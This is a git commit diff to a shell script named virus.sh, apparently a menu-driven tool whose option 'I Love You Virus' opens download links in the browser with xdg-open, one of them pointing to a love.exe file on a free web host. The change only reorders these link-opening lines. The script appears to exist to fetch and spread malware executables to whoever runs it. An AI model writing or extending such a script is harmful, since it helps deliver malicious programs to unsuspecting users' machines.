ad6e21dd7c742d8412925c8e40827dbb348ecb97
Tech Hacker <114179175+TechHacker737@users.noreply.github.com>
2023-09-05 01:04:53 +0530

    Update virus.sh

--- virus.sh
+++ virus.sh
@@ -40,9 +40,9 @@ link1="https://wdevmail.000webhostapp.com/Bach%20File/love.exe"
         1)
             echo "You selected:  I Love You Virus"
             # Add code to run the other bash script here
-            xdg-open "$link00" &
             xdg-open "$link0" &
             xdg-open "$link1" &
+            xdg-open "$link00" &
   # Open link in default browser
             ;;
         2)
